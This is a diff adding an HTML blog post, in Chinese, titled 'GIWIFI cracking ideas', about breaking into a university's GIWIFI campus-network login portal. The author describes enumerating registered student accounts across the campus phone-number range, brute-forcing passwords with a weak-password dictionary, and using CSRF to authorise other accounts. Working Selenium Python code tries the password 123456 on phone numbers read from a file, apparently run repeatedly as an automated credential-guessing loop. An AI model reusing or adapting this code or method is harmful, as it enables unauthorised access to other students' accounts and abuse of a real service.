@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GIWIFI破解思路 - co0ontty</title>
+    <meta name="author"  content="co0ontty">
+    <meta name="description" content="GIWIFI破解思路">
+    <meta name="keywords"  content="python, Tools, ALL">
+    <!-- Open Graph -->
+    <meta property="og:title" content="GIWIFI破解思路 - co0ontty">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="http://localhost:4000/2019/01/17/GIWIFI.html">
+    <meta property="og:description" content="Share my leaning。">
+    <meta property="og:site_name" content="co0ontty">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/share.min.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+	
+	<!--
+Author: Ray-Eldath
+refer to:
+ - http://docs.mathjax.org/en/latest/options/index.html
+-->
+
+	<script type="text/javascript" async src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+	
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+		jax: ["input/TeX", "output/HTML-CSS"],
+		tex2jax: {
+			inlineMath: [ ["$", "$"] ],
+			displayMath: [ ["$$", "$$"] ],
+			skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+		},
+		"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"] }
+      });
+    </script>
+
+	
+    <!--
+Author: Ray-Eldath
+-->
+<style>
+    .markdown-body .anchor{
+        float: left;
+        margin-top: -8px;
+        margin-left: -20px;
+        padding-right: 4px;
+        line-height: 1;
+        opacity: 0;
+    }
+    
+    .markdown-body .anchor .anchor-icon{
+        font-size: 15px
+    }
+</style>
+<script>
+    $(document).ready(function() {
+        let nodes = document.querySelector(".markdown-body").querySelectorAll("h1,h2,h3")
+        for(let node of nodes) {
+            var anchor = document.createElement("a")
+            var anchorIcon = document.createElement("i")
+            anchorIcon.setAttribute("class", "fa fa-anchor fa-lg anchor-icon")
+            anchorIcon.setAttribute("aria-hidden", true)
+            anchor.setAttribute("class", "anchor")
+            anchor.setAttribute("href", "#" + node.getAttribute("id"))
+            
+            anchor.onmouseover = function() {
+                this.style.opacity = "0.4"
+            }
+            
+            anchor.onmouseout = function() {
+                this.style.opacity = "0"
+            }
+            
+            anchor.appendChild(anchorIcon)
+            node.appendChild(anchor)
+        }
+    })
+</script>
+</head>
+
+
+<body>
+  <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+  <input id="nm-switch" type="hidden" value="true"> <header class="g-header">
+    <div class="g-logo">
+      <a href="/"></a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">首页</a></li>
+            
+            <li><a href="/tags.html">标签</a></li>
+            
+            <li><a href="/links.html">友链</a></li>
+            
+            <li><a href="/about.html">关于我</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+  <header
+    class="g-banner post-header post-pattern-circuitBoard bgcolor-default "
+    data-theme="default"
+  >
+    <div class="post-wrapper">
+      <div class="post-tags">
+        
+          
+            <a href="http://localhost:4000/tags#python" class="post-tag">python</a>
+          
+            <a href="http://localhost:4000/tags#Tools" class="post-tag">Tools</a>
+          
+            <a href="http://localhost:4000/tags#ALL" class="post-tag">ALL</a>
+          
+        
+      </div>
+      <h1>GIWIFI破解思路</h1>
+      <div class="post-meta">
+        <span class="post-meta-item"><i class="iconfont icon-author"></i>co0ontty</span>
+        <time class="post-meta-item" datetime="19-01-17"><i class="iconfont icon-date"></i>17 Jan 2019</time>
+      </div>
+    </div>
+    
+    <div class="filter"></div>
+      <div class="post-cover" style="background: url('https://i.loli.net/2019/04/05/5ca6ba3c2d9ee.png') center no-repeat; background-size: cover;"></div>
+    
+  </header>
+
+  <div class="post-content visible">
+    
+
+    <article class="markdown-body">
+      <h2 id="发现思路">发现思路：</h2>
+
+<h4 id="账号">账号：</h4>
+
+<p>1、我所在的学校使用GIWIFI的校园网解决方案，登陆账号为学生本人的手机号。学校学生使用的手机号均为学校内运营商入学时发放的校园卡，均处在一个号段，每个账号每天拥有15分钟的免费时长。
+2、手机号如果注册过GIWIFI，正确登陆后便可使用互联网服务。如果账号未注册GIWIFI，使用任意密码登录后便会要求填写身份信息。根据这项区别便可使用手机号段字典爆破出注册过的账号。</p>
+
+<h4 id="密码">密码：</h4>
+
+<p>GIWIFI官方要求使用的密码为6位及以上，所以使用弱口令字典进行爆破。</p>
+
+<h4 id="登陆">登陆：</h4>
+
+<p>有了账号和密码，便需要解决登陆问题。我的思路是使用python进行自动登录。同时可以使用CSRF攻击实现越权对其他账号上网状态进行授权</p>
+
+<h2 id="实现过程">实现过程：</h2>
+
+<h5 id="1使用python的webdriver库自动打开校园网的登陆链接">1、使用python的webdriver库，自动打开校园网的登陆链接。</h5>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wd</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
+
+<span class="n">wd</span><span class="o">.</span><span class="n">implicitly_wait</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>  
+
+<span class="n">wd</span><span class="o">.</span><span class="n">set_page_load_timeout</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+
+<span class="n">wd</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://login.gwifi.com.cn/cmps/admin.php/api/login/?</span><span class="err">
+</span><span class="s">gw_address=172.16.1.5&amp;gw_port=8060&amp;gw_id=GWIFI-qingdaoshankedaD2&amp;ip=172.17.142.232&amp;mac=F0:18:98:19:70:D9&amp;url=http://www.baidu.com?ua=Mozilla&amp;apmac=00:0b:ab:f1:c6:d4&amp;ssid="</span><span class="p">)</span>  
+
+<span class="n">wd</span><span class="o">.</span><span class="n">maximize_window</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>最后一行代码指定python调用浏览器后的显示方式为最大化，如果要静默使用可以将maximize换成minimize</p>
+
+<h5 id="2传递用户名密码参数并点击登陆">2、传递用户名密码参数，并点击登陆</h5>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">name_input</span> <span class="o">=</span> <span class="n">wd</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'first_name'</span><span class="p">)</span>  <span class="c1"># 找到用户名的框框. 
+</span>
+<span class="n">pass_input</span> <span class="o">=</span> <span class="n">wd</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'first_password'</span><span class="p">)</span>  
+
+<span class="n">login_button</span> <span class="o">=</span> <span class="n">wd</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'first_button'</span><span class="p">)</span>  
+
+<span class="n">name_input</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>  
+
+<span class="n">name_input</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">phonenumber</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>  <span class="c1"># 填写用户名  
+</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span> 
+
+<span class="n">pass_input</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+
+<span class="n">pass_input</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="mi">123456</span><span class="p">)</span>  <span class="c1"># 填写密码
+</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+
+<span class="n">login_button</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>         <span class="c1"># 点击登录
+</span>
+<span class="n">wd</span><span class="o">.</span><span class="n">implicitly_wait</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+
+<span class="n">wd</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h5 id="3其他工作">3、其他工作</h5>
+
+<p>·关于用户名密码，我选择的方式是存在文件里，然后使用python读文件的方式向网页中传递参数。<br />
+·关于wd库，之所以选择wd库是因为这样可以看到登陆的状态，若果选择通过requests库直接传递参数，便不会在第一时间发现网络连接不通畅和详细的问题。<br />
+·关于自动登录，使用sh的ping命令原理，新建脚本，每五分钟运行一次，断网后自动调用python脚本。</p>
+
+<h2 id="全部代码">全部代码：</h2>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># -*- coding:utf-8 -*-
+</span>
+<span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
+<span class="kn">from</span> <span class="nn">selenium.webdriver.support.wait</span> <span class="kn">import</span> <span class="n">WebDriverWait</span>
+<span class="kn">from</span> <span class="nn">selenium.webdriver.support</span> <span class="kn">import</span> <span class="n">expected_conditions</span> <span class="k">as</span> <span class="n">EC</span>
+<span class="kn">from</span> <span class="nn">selenium.common.exceptions</span> <span class="kn">import</span> <span class="n">NoSuchElementException</span>
+<span class="kn">from</span> <span class="nn">selenium.webdriver.common.by</span> <span class="kn">import</span> <span class="n">By</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+
+<span class="c1"># option=webdriver.ChromeOptions()
+# option.add_argument('--headless')
+# option.add_argument('--no-sandbox')
+# option.add_argument('--start-maximized')
+# wd = webdriver.Chrome(chrome_options=option)
+</span>
+
+<span class="n">wd</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
+<span class="n">wd</span><span class="o">.</span><span class="n">implicitly_wait</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+<span class="n">wd</span><span class="o">.</span><span class="n">set_page_load_timeout</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+<span class="n">wd</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://login.gwifi.com.cn/cmps/admin.php/api/login/?gw_address=172.16.1.5&amp;gw_port=8060&amp;gw_id=GWIFI-qingdaoshankedaD2&amp;ip=172.17.142.232&amp;mac=F0:18:98:19:70:D9&amp;url=http://www.baidu.com?ua=Mozilla&amp;apmac=00:0b:ab:f1:c6:d4&amp;ssid="</span><span class="p">)</span>
+<span class="n">wd</span><span class="o">.</span><span class="n">maximize_window</span><span class="p">()</span>
+<span class="nb">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"giwifi2.txt"</span><span class="p">)</span>
+<span class="n">phonenumber</span> <span class="o">=</span> <span class="nb">file</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">phonenumber</span><span class="p">)):</span>
+    <span class="n">phonenumber</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">phonenumber</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="s">""</span><span class="p">)</span> 
+    <span class="k">pass</span>
+<span class="c1"># print(phonenumber[0])
+# print(type(phonenumber))
+</span>
+<span class="s">"""这段可以查看selenium的源码,属于smart wait"""</span>
+<span class="n">name_input</span> <span class="o">=</span> <span class="n">wd</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'first_name'</span><span class="p">)</span>  <span class="c1"># 找到用户名的框框
+</span><span class="n">pass_input</span> <span class="o">=</span> <span class="n">wd</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'first_password'</span><span class="p">)</span>
+<span class="n">login_button</span> <span class="o">=</span> <span class="n">wd</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'first_button'</span><span class="p">)</span>
+<span class="n">name_input</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+<span class="n">name_input</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">phonenumber</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>  <span class="c1"># 填写用户名
+</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+<span class="n">pass_input</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+<span class="n">pass_input</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="mi">123456</span><span class="p">)</span>  <span class="c1"># 填写密码
+</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+<span class="n">login_button</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>         <span class="c1"># 点击登录
+</span><span class="n">wd</span><span class="o">.</span><span class="n">implicitly_wait</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">wd</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
+<span class="k">print</span> <span class="p">(</span><span class="n">phonenumber</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+<span class="k">del</span> <span class="n">phonenumber</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="nb">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"giwifi2.txt"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">phonenumber</span><span class="p">)):</span>
+    <span class="nb">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">phonenumber</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+    <span class="nb">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">pass</span>
+<span class="nb">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="k">print</span> <span class="p">(</span><span class="s">"All Done"</span><span class="p">)</span>
+<span class="nb">exit</span><span class="p">()</span>
+</code></pre></div></div>
+
+    </article>
+
+    
+    <div class="social-share-wrapper">
+      <div class="social-share"></div>
+    </div>
+    
+  </div>
+
+  <section class="author-detail">
+    <section class="post-footer-item author-card">
+      <div class="avatar">
+        <img src="http://localhost:4000/assets/img/profile.png" alt="">
+      </div>
+      <div class="author-name" rel="author">co0ontty</div>
+      <div class="bio">
+        <p>山东科技大学（泰安）啄木鸟安全实验室创始成员</p>
+      </div>
+      
+      <ul class="sns-links">
+        
+        <li>
+          <a href="//weibo.com/5792988237" target="_blank">
+                    <i class="iconfont icon-weibo"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="mailto:co0ontty@aliyin.com" target="_blank">
+                    <i class="iconfont icon-email"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="//facebook.com/co0ontty" target="_blank">
+                    <i class="iconfont icon-facebook"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="//github.com/co0ontty" target="_blank">
+                    <i class="iconfont icon-github"></i>
+                </a>
+        </li>
+        
+      </ul>
+      
+    </section>
+    <section class="post-footer-item read-next">
+      
+      <div class="read-next-item">
+        <a href="/2019/01/17/Bugkuweb.html" class="read-next-link"></a>
+        <section>
+          <span>Bugku-web结题思路(持续更新)</span>
+          <p>1、web2：</p>
+        </section>
+        
+        <div class="filter"></div>
+        <img src="https://i.loli.net/2019/04/04/5ca5adcb6096c.png" alt="">
+        
+     </div>
+      
+
+      
+      <div class="read-next-item">
+        <a href="/2019/01/06/ctfd.html" class="read-next-link"></a>
+          <section>
+            <span>CTFd搭建及优化教程</span>
+            <p>依赖环境安装</p>
+          </section>
+          
+          <div class="filter"></div>
+          <img src="https://ctfd.io/static/img/ctfd.svg" alt="">
+          
+      </div>
+      
+    </section>
+    
+  </section>
+<div id="lv-container" data-id="city" data-uid="MTAyMC80MTI3My8xNzgyMQ==">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+  <footer class="g-footer">
+  <!-- <section><a href="javascript:scroll(50,50)">回到顶端</a></section> -->
+<!-- 网站计数器 -->
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <div style="margin: auto;width: auto;">
+      <span id="site_pv_count" title="总点击量"><img src="/assets/vendor/octicons/svg/eye.svg" width=16 height=16 > <span id="busuanzi_value_site_pv"></span></span> &nbsp; &nbsp; | &nbsp; &nbsp; 
+    <span id="site_uv_count" title="总访客量"> <img src="/assets/vendor/octicons/svg/person.svg" width=10 height=16> <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+<!-- 到此为止 -->
+  <section>co0ontty ©
+  
+  
+    2018
+    -
+  
+  2019
+  </section>
+  <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+
+
+</footer>
+
+
+  <script src="/assets/js/social-share.min.js"></script>
+  <script>
+    socialShare('.social-share', {
+      sites: [
+        
+          'wechat'
+          ,
+          
+        
+          'weibo'
+          ,
+          
+        
+          'douban'
+          ,
+          
+        
+          'twitter'
+          
+        
+      ],
+      wechatQrcodeTitle: "分享到微信朋友圈",
+      wechatQrcodeHelper: '<p>扫码后点击右上角</p><p>将本文分享至朋友圈</p>'
+    });
+  </script>
+
+  
+  
+
+  <script src="/assets/js/prism.js"></script>
+  <script src="/assets/js/index.min.js"></script>
+  <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?7084bb2b47ca9a611ae8225633e5caeb";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-129901756-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-129901756-1');
+</script>
+
+</body>
+
+</html>
